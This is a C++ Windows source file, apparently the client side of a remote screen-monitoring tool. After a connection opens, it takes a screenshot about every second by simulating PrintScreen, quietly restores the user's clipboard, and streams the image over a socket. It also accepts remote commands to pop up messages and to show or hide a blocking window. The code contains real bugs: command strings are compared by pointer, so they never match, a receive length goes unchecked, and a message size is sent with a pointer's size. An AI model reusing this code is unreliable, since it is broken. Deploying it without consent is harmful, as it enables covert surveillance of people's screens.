#include <filesystem>
#include <sstream>
#include <iostream>
#include <vector>
#include <map>
#include <fstream>

#include "windows.h"

extern HWND hwnd;

void errhandler(std::string err)
{
    std::cerr << err << std::endl;
}

HBITMAP LoadBitmapFromVector(const std::vector<BYTE>& data, int width, int height) {
    if (data.empty()) return NULL;

    HDC hdc = GetDC(NULL);
    void* pBits = nullptr;

    BITMAPINFOHEADER biHeader = {};
    biHeader.biSize = sizeof(BITMAPINFOHEADER);
    biHeader.biWidth = width;
    biHeader.biHeight = -height; // Negatywna wysokoœæ dla poprawnego odwzorowania
    biHeader.biPlanes = 1;
    biHeader.biBitCount = 32;
    biHeader.biCompression = BI_RGB;

    HBITMAP hBitmap = CreateDIBSection(hdc, (BITMAPINFO*)&biHeader, DIB_RGB_COLORS, &pBits, NULL, 0);
    if (hBitmap && pBits) {
        memcpy(pBits, data.data(), data.size());
    }

    ReleaseDC(NULL, hdc);
    return hBitmap;
}

bool SaveBitmapToVector(HBITMAP hBitmap, std::vector<BYTE>& outData) {
    if (!hBitmap) return false;

    HDC hdc = GetDC(NULL);
    HDC memDC = CreateCompatibleDC(hdc);
    BITMAP bmp;
    GetObject(hBitmap, sizeof(BITMAP), &bmp);

    BITMAPINFOHEADER biHeader = {};
    biHeader.biSize = sizeof(BITMAPINFOHEADER);
    biHeader.biWidth = bmp.bmWidth;
    biHeader.biHeight = -bmp.bmHeight; // Ujemna wysokoœæ dla poprawnego odwzorowania
    biHeader.biPlanes = 1;
    biHeader.biBitCount = 32;
    biHeader.biCompression = BI_RGB;

    SIZE_T dataSize = bmp.bmWidth * bmp.bmHeight * 4;
    outData.resize(dataSize);

    if (!GetDIBits(memDC, hBitmap, 0, bmp.bmHeight, outData.data(), (BITMAPINFO*)&biHeader, DIB_RGB_COLORS)) {
        DeleteDC(memDC);
        ReleaseDC(NULL, hdc);
        return false;
    }

    DeleteDC(memDC);
    ReleaseDC(NULL, hdc);
    return true;
}


void saveClipboard(std::map<UINT, std::vector<BYTE>>& clipboard, std::vector<BYTE>& bitmapData, int& width, int& height) {
    if (!OpenClipboard(nullptr)) {
        std::cerr << "Nie mo¿na otworzyæ schowka!" << std::endl;
        return;
    }

    clipboard.clear();
    bitmapData.clear();
    width = 0;
    height = 0;

    UINT format = 0;
    while ((format = EnumClipboardFormats(format))) {
        HANDLE hData = GetClipboardData(format);
        if (!hData) continue;

        if (format == CF_BITMAP) {
            // Poprawiona obs³uga bitmapy - kopiujemy j¹ zamiast u¿ywaæ orygina³u!
            HBITMAP hBitmap = (HBITMAP)CopyImage(hData, IMAGE_BITMAP, 0, 0, LR_CREATEDIBSECTION);
            if (hBitmap) {
                BITMAP bmp;
                if (GetObject(hBitmap, sizeof(BITMAP), &bmp)) {
                    width = bmp.bmWidth;
                    height = bmp.bmHeight;
                    SaveBitmapToVector(hBitmap, bitmapData);
                }
                DeleteObject(hBitmap); // Zwolnienie tymczasowej kopii
            }
        }
        else {
            HGLOBAL hMem = (HGLOBAL)hData;
            SIZE_T size = GlobalSize(hMem);
            if (size > 0) {
                void* src = GlobalLock(hMem);
                if (src) {
                    std::vector<BYTE> data(size);
                    memcpy(data.data(), src, size);
                    clipboard[format] = std::move(data);
                    GlobalUnlock(hMem);
                }
            }
        }
    }
    CloseClipboard();
}


void restoreClipboard(const std::map<UINT, std::vector<BYTE>>& clipboard, const std::vector<BYTE>& bitmapData, int width, int height) {
    if (!OpenClipboard(nullptr)) {
        std::cerr << "Nie mo¿na otworzyæ schowka!" << std::endl;
        return;
    }
    EmptyClipboard();

    // Odtwarzanie wszystkich formatów poza bitmap¹
    for (const auto& entry : clipboard) {
        UINT format = entry.first;
        const std::vector<BYTE>& data = entry.second;

        HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, data.size());
        if (!hMem) continue;

        void* dest = GlobalLock(hMem);
        if (dest) {
            memcpy(dest, data.data(), data.size());
            GlobalUnlock(hMem);
            SetClipboardData(format, hMem);
        }
        else {
            GlobalFree(hMem);  // Sprz¹tanie pamiêci w przypadku b³êdu
        }
    }

    // Odtwarzanie bitmapy
    if (!bitmapData.empty()) {
        HBITMAP hBitmap = LoadBitmapFromVector(bitmapData, width, height);
        if (hBitmap) {
            SetClipboardData(CF_BITMAP, hBitmap);
        }
    }

    CloseClipboard();
}

HBITMAP GetScreenShot() {
    std::map<UINT, std::vector<BYTE>> clipboardData;
    std::vector<BYTE> bitmapData;
    int width = 0, height = 0;

    saveClipboard(clipboardData, bitmapData, width, height);

    keybd_event(VK_SNAPSHOT, 0, 0, 0);
    keybd_event(VK_SNAPSHOT, 0, KEYEVENTF_KEYUP, 0);

    Sleep(100); // Mo¿na zamiast tego u¿yæ pêtli sprawdzaj¹cej

    if (!OpenClipboard(nullptr)) {
        std::cerr << "Nie mo¿na otworzyæ schowka po zrzucie ekranu!" << std::endl;
        restoreClipboard(clipboardData, bitmapData, width, height);
        return nullptr;
    }

    HANDLE hData = GetClipboardData(CF_BITMAP);
    if (!hData) {
        std::cerr << "Nie mo¿na pobraæ bitmapy ze schowka!" << std::endl;
        CloseClipboard();
        restoreClipboard(clipboardData, bitmapData, width, height);
        return nullptr;
    }

    HBITMAP hBitmap = (HBITMAP)CopyImage(hData, IMAGE_BITMAP, 0, 0, LR_CREATEDIBSECTION);
    CloseClipboard(); // Zamykamy schowek po pobraniu bitmapy

    if (!hBitmap) {
        std::cerr << "B³¹d kopiowania bitmapy!" << std::endl;
        restoreClipboard(clipboardData, bitmapData, width, height);
        return nullptr;
    }

    BITMAP bmp;
    if (GetObject(hBitmap, sizeof(BITMAP), &bmp)) {
        width = bmp.bmWidth;
        height = bmp.bmHeight;
        SaveBitmapToVector(hBitmap, bitmapData);
    }

    restoreClipboard(clipboardData, bitmapData, width, height);

    return hBitmap;
}

PBITMAPINFO CreateBitmapInfoStruct(HBITMAP hBmp)
{
    BITMAP bmp;
    PBITMAPINFO pbmi;
    WORD    cClrBits;

    // Retrieve the bitmap color format, width, and height.  
    if (!GetObject(hBmp, sizeof(BITMAP), (LPSTR)&bmp))
        errhandler("GetObject");

    // Convert the color format to a count of bits.  
    cClrBits = (WORD)(bmp.bmPlanes * bmp.bmBitsPixel);
    if (cClrBits == 1)
        cClrBits = 1;
    else if (cClrBits <= 4)
        cClrBits = 4;
    else if (cClrBits <= 8)
        cClrBits = 8;
    else if (cClrBits <= 16)
        cClrBits = 16;
    else if (cClrBits <= 24)
        cClrBits = 24;
    else cClrBits = 32;

    // Allocate memory for the BITMAPINFO structure. (This structure  
    // contains a BITMAPINFOHEADER structure and an array of RGBQUAD  
    // data structures.)  

    if (cClrBits < 24)
        pbmi = (PBITMAPINFO)LocalAlloc(LPTR,
            sizeof(BITMAPINFOHEADER) +
            sizeof(RGBQUAD) * (1 << cClrBits));

    // There is no RGBQUAD array for these formats: 24-bit-per-pixel or 32-bit-per-pixel 

    else
        pbmi = (PBITMAPINFO)LocalAlloc(LPTR,
            sizeof(BITMAPINFOHEADER));

    // Initialize the fields in the BITMAPINFO structure.  

    pbmi->bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    pbmi->bmiHeader.biWidth = bmp.bmWidth;
    pbmi->bmiHeader.biHeight = bmp.bmHeight;
    pbmi->bmiHeader.biPlanes = bmp.bmPlanes;
    pbmi->bmiHeader.biBitCount = bmp.bmBitsPixel;
    if (cClrBits < 24)
        pbmi->bmiHeader.biClrUsed = (1 << cClrBits);

    // If the bitmap is not compressed, set the BI_RGB flag.  
    pbmi->bmiHeader.biCompression = BI_RGB;

    // Compute the number of bytes in the array of color  
    // indices and store the result in biSizeImage.  
    // The width must be DWORD aligned unless the bitmap is RLE 
    // compressed. 
    pbmi->bmiHeader.biSizeImage = ((pbmi->bmiHeader.biWidth * cClrBits + 31) & ~31) / 8
        * pbmi->bmiHeader.biHeight;
    // Set biClrImportant to 0, indicating that all of the  
    // device colors are important.  
    pbmi->bmiHeader.biClrImportant = 0;
    return pbmi;
}

void CreateBMPFile(LPTSTR pszFile, PBITMAPINFO pbi,
    HBITMAP hBMP, HDC hDC)
{
    HANDLE hf;                 // file handle  
    BITMAPFILEHEADER hdr;       // bitmap file-header  
    PBITMAPINFOHEADER pbih;     // bitmap info-header  
    LPBYTE lpBits;              // memory pointer  
    DWORD dwTotal;              // total count of bytes  
    DWORD cb;                   // incremental count of bytes  
    BYTE* hp;                   // byte pointer  
    DWORD dwTmp;

    pbih = (PBITMAPINFOHEADER)pbi;
    lpBits = (LPBYTE)GlobalAlloc(GMEM_FIXED, pbih->biSizeImage);

    if (!lpBits)
        errhandler("GlobalAlloc");

    // Retrieve the color table (RGBQUAD array) and the bits  
    // (array of palette indices) from the DIB.  
    if (!GetDIBits(hDC, hBMP, 0, (WORD)pbih->biHeight, lpBits, pbi,
        DIB_RGB_COLORS))
    {
        errhandler("GetDIBits");
    }

    // Create the .BMP file.  
    hf = CreateFile(pszFile,
        GENERIC_READ | GENERIC_WRITE,
        (DWORD)0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        (HANDLE)NULL);
    if (hf == INVALID_HANDLE_VALUE)
        errhandler("CreateFile");
    hdr.bfType = 0x4d42;        // 0x42 = "B" 0x4d = "M"  
    // Compute the size of the entire file.  
    hdr.bfSize = (DWORD)(sizeof(BITMAPFILEHEADER) +
        pbih->biSize + pbih->biClrUsed
        * sizeof(RGBQUAD) + pbih->biSizeImage);
    hdr.bfReserved1 = 0;
    hdr.bfReserved2 = 0;

    // Compute the offset to the array of color indices.  
    hdr.bfOffBits = (DWORD)sizeof(BITMAPFILEHEADER) +
        pbih->biSize + pbih->biClrUsed
        * sizeof(RGBQUAD);

    // Copy the BITMAPFILEHEADER into the .BMP file.  
    if (!WriteFile(hf, (LPVOID)&hdr, sizeof(BITMAPFILEHEADER),
        (LPDWORD)&dwTmp, NULL))
    {
        errhandler("WriteFile");
    }

    // Copy the BITMAPINFOHEADER and RGBQUAD array into the file.  
    if (!WriteFile(hf, (LPVOID)pbih, sizeof(BITMAPINFOHEADER)
        + pbih->biClrUsed * sizeof(RGBQUAD),
        (LPDWORD)&dwTmp, (NULL)))
        errhandler("WriteFile");

    // Copy the array of color indices into the .BMP file.  
    dwTotal = cb = pbih->biSizeImage;
    hp = lpBits;
    if (!WriteFile(hf, (LPSTR)hp, (int)cb, (LPDWORD)&dwTmp, NULL))
        errhandler("WriteFile");

    // Close the .BMP file.  
    if (!CloseHandle(hf))
        errhandler("CloseHandle");

    // Free memory.  
    GlobalFree((HGLOBAL)lpBits);
}

void windows(SOCKET clientSocket)
{
    std::cout << "CONNECTED\n";
    char clientIdBuffer[256];
    //send(clientSocket, clientIdBuffer, sizeof(clientIdBuffer), 0);
    bool fl = false;

    while (true)
    {
        char buffer[256];
        int l = recv(clientSocket, buffer, sizeof(buffer), 0);
        buffer[l] = '\0';
        std::cout << buffer << std::endl;
        if (buffer == "messageBox")
        {
            recv(clientSocket, buffer, sizeof(buffer), 0);
            char message[512];
            recv(clientSocket, buffer, sizeof(message), 0);
            MessageBoxA(NULL, message, buffer, NULL);
        }
        else if (buffer == "block")
        {
            fl = true;
            ShowWindow(hwnd, SW_SHOW);
            UpdateWindow(hwnd);
        }
        else if (buffer == "unblock")
        {
            ShowWindow(hwnd, SW_HIDE);
            UpdateWindow(hwnd);
            fl = false;
        }

        LPTSTR lptstr = (LPTSTR)L"screenshot.bmp";

        HBITMAP hBmp = GetScreenShot();
        CreateBMPFile(lptstr, CreateBitmapInfoStruct(hBmp), hBmp, GetDC(NULL));

        std::fstream file;
        file.open("screenshot.bmp", std::ios::binary | std::ios::in);
        if (!file.good()) {
            errhandler("Error while opening the screenshot");
            return;
        }

        char buff[BUFFER];
        int i = 0;
        
        int size = (int)std::filesystem::file_size("screenshot.bmp");
        
        std::stringstream ss;
        ss << size;
        std::string s = ss.str();
        const char* sss = s.c_str();
        send(clientSocket, ss.str().c_str(), sizeof(ss.str().c_str()), 0);

        while (file.read(buff, BUFFER)) { 
            send(clientSocket, buff, BUFFER, NULL);
            //std::cout << ++i << std::endl;
        }

        send(clientSocket, buff, file.gcount(), 0);

        file.close();

        Sleep(1000);
    } 

    closesocket(clientSocket);
}
